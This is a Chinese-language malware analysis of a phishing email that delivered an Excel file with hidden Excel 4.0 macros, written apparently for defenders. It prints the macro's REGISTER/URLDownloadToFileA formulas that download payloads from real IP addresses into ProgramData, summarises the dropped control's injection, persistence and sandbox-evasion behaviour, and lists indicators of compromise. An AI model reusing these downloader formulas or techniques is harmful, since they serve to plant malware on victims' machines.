近期有同事反映疑似收到了钓鱼邮件。发件人也是公司同事的名字，但发件邮箱
comercial1@qualitypro.com.co不是公司的邮箱，正文转发了之前的邮件信息，在最上面添加了一个下载附件的链接。![](https://image.3001.net/images/20220311/1646966042_622ab51ac987012bf8e1a.png!small)

查询邮箱注册名在国外，被情报网站标记为恶意。首次发现时间为2018年，在02-21
也就是同事收到邮件的当天，情报信息被更新了，看来是一次有准备的大规模的钓鱼攻击。

![](https://image.3001.net/images/20220311/1646965909_622ab4955e4f770c76ecc.png!small)

ip下域名绑定1000+，

![](https://image.3001.net/images/20220311/1646966076_622ab53c63415d829201c.png!small)

ip下有很多官方证书，此ip为肉鸡。

![](https://image.3001.net/images/20220311/1646966086_622ab54694e2a2f0bd617.png!small)

发件邮箱在google搜索为哥伦比亚的一家除虫公司，应该也是之前被钓鱼的肉鸡。

复制下载链接hXXp://satarabazar.com/run/5rihx330L1.zip下载邮件。

内容是诱导用户启用宏。语言是英语，猜测主要是针对国外公司APT攻击。

##  **office** **分析**

![](https://image.3001.net/images/20220311/1646966116_622ab564cc419af0c144d.png!small)

取消隐藏：

![](https://image.3001.net/images/20220311/1646966171_622ab59bc4836d909aadb.png!small)

里面有13个隐藏的tab:

![](https://image.3001.net/images/20220311/1646966197_622ab5b51e43349aa3680.png!small)

这里被折叠了：

![](https://image.3001.net/images/20220311/1646966206_622ab5becfd2eeb724690.png!small)

展开，把字体设置成黑色(APT惯用伎俩白底白字)

![](https://image.3001.net/images/20220311/1646966218_622ab5ca478e1b005bdf3.png!small)

##  **EXCEL 4.0** **语法**

与 VBA 宏相比，XLM 宏以完全不同的方式存储在 Excel 文件中。在较新的 .xlsm Excel 文件格式（基于 XML 的 ZIP
容器）中，XLM 宏表存储在子目录“macrosheets”下的 XML 文件中，隐蔽性更好。

虚拟机打开，

excel单元格 右键 点击执行 -> 单步执行 -> 求值。

![](https://image.3001.net/images/20220311/1646966227_622ab5d32c9d5ca15d747.png!small)![](https://image.3001.net/images/20220311/1646966239_622ab5dfd6430ce9f6396.png!small)

注意查看完“求值”后要点击“中止”将程序中断，否则会继续执行恶意代码。

=REGISTER(D21,Hertip&"FileA",Tiposa!D20,D23,,Tiposa!D22,Tiposa!D23)

    
    
    =REGISTER("uRlMon","URLDownloadToFileA","JJCCBB","Drwrgdfghfhf",,1,9)

  

对于 =REGISTER("uRlMon","URLDownloadToFileA","JJCCBB","Drwrgdfghfhf",,1,9) ，

    
    
    REGISTER(module_name, procedure_name, type, alias, argument, macro_type, category)
    
     
    
    Module_name is the name of the DLL, for example "uRlMon" for C:\Windows\System32\urlmon.dll.
    
    Procedure_name is the name of the exported function in the DLL, for example "URLDownloadToFileA".
    
    Type is a string specifying the types of return value and arguments of the functions. More on this below（微软Excel4.0数据类型描述）.
    
    Alias is a custom name that you can give to the function, by which you can call it later.
    
    Argument can be used to name the arguments to the function, but is optional (and left blank in our code).
    
    Macro_type should be 1, which stands for function.
    
    Category is a category number (used in ancient Excel functionality). We can specify an arbitrary category number between 1 and 14 for our purpose.

[微软Excel4.0数据类型描述](https://support.microsoft.com/en-us/office/using-the-call-and-register-functions-06fa83c1-2869-4a89-b665-7e63d188307f?ui=en-us&rs=en-us&ad=us#__toc309221612)

The biggest challenge of getting Win32 API functions to work with XLM macros
is matching the types that are expected by the Win32 API functions with
available Excel 4.0 data types. 根据官网文档，"JJCCBB" 可能表示 the return value for this
function is long int ("J"), long int , string ("C"), string ("C"), double ,
double respectively.

上面的一句话含义为 自定义一个函数名，调用系统自带的dll的导出函数的功能，可以调用的功能很多，自由发挥，例如 kernel32.VirtualAlloc
或 kernel32.WriteProcessMemory、kernel32.CreateThread 等。

Tiposa1!G11=NOW()

    
    
    =Drwrgdfghfhf(0,"http://94.140.114.240/"NOW()".dat","C:\ProgramData\Hroser1.ocx",0,0)
    
    =Drwrgdfghfhf(0,"http://194.156.98.30/"NOW()".dat","C:\ProgramData\Hroser2.ocx",0,0)
    
    =Drwrgdfghfhf(0,"http://144.217.50.246/"NOW()".dat","C:\ProgramData\Hroser3.ocx",0,0)

即

    
    
    =uRlMon.URLDownloadToFileA(0,"http://94.140.114.240/44617.771099537036.dat","C:\ProgramData\Hroser1.ocx",0,0)

与时间戳绑定，而且网站经常不能下载。也有可能是验证了UA头为office，或者主要针对国外。

https://s.threatbook.cn/report/file/9891ad11b3a5e308f6ef9b63c9bf2c177a0f6b958752ba7a81d5ca878c376303/?env=win7sp1enx64_office2013

##  **恶意控件本地行为分析**

Hroser1.ocx进行的操作：

进程注入：

    
    
    NtMapViewOfSection：https://blog.csdn.net/hgy413/article/details/7799843

计划任务&注册一个控件(DLL)：

![1646982494_622af55e823bc5f76b5b7.png!small?1646982495365](https://image.3001.net/images/20220311/1646982494_622af55e823bc5f76b5b7.png!small?1646982495365)

枚举进程模块(CreateToolhelp32Snapshot)，查找指定进程名：

    
    
    potential cuckoo sandbox detection

sleep:

    
    
    explorer.exe  tried to sleep 411.043 seconds

信息搜集：

查询计算机名(GetComputerNameW)，获取系统信息(GetSystemInfo)，查询系统用户名(GetUserNameA),读取计算机名称(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\ComputerName\ActiveComputerName\ComputerName),

  

##  **威胁** **IOC**

    
    
    hxxp://94.140.114.240/44617.771099537036.dat  
    hxxp://194.156.98.30/44617.771099537036.dat  
    hxxp://144.217.50.246/44617.771099537036.dat  
    hXXp://satarabazar.com/run/5rihx330L1.zip  
    c375c83c189acf6199d36980377483f8  
    4b3d3146d7d6ad9396233f791ff050e4

##  **reference**

<https://blog.didierstevens.com/programs/oledump-py/>

<http://didierstevens.com/files/software/oledump_V0_0_63.zip>

[如何注册ocx文件](https://jingyan.baidu.com/article/c910274bfea203cd361d2db9.html)

[Old school: evil Excel 4.0 macros
(XLM)﻿](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)

